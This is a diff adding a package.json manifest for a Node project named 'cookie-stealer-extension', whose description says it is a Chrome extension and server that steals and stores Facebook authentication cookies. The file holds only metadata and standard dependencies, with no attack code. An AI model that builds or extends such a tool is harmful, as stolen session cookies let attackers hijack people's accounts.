@@ -1,0 +1,26 @@
+{
+  "name": "cookie-stealer-extension",
+  "version": "1.0.0",
+  "description": "App chrome extension + server that steals facebook auth cookies and store it.",
+  "main": "api/index.js",
+  "scripts": {
+    "start": "micro",
+    "dev": "nodemon api/index.js"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/jalbertsr/"
+  },
+  "author": "jalberts",
+  "license": "ISC",
+  "dependencies": {
+    "body-parser": "^1.18.3",
+    "dotenv": "^6.0.0",
+    "express": "^4.16.3",
+    "micro": "^9.3.3",
+    "mongoose": "^5.2.12"
+  },
+  "devDependencies": {
+    "nodemon": "^1.18.4"
+  }
+}
